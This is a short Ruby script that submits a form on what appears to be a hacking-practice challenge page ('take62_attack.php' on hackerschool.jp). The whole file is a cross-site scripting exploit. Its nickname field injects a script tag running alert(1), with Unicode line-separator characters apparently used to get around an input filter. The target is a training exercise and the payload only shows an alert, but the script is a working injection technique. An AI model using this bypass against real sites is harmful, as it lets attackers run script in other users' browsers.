#!/usr/bin/ruby
require 'net/http'
uri=URI.parse('http://www.hackerschool.jp/hack/take62_attack.php')
Net::HTTP.start(uri.host){|http|
	puts http.post(uri.path,%Q(submit=%E7%99%BB%E9%8C%B2&nickname=\u2028<script type="text/javascript">\u2028alert(1)\u2028</script>),{
		'Referer'=>'http://www.hackerschool.jp/hack/take62_attack.php'
	}).body.chomp
}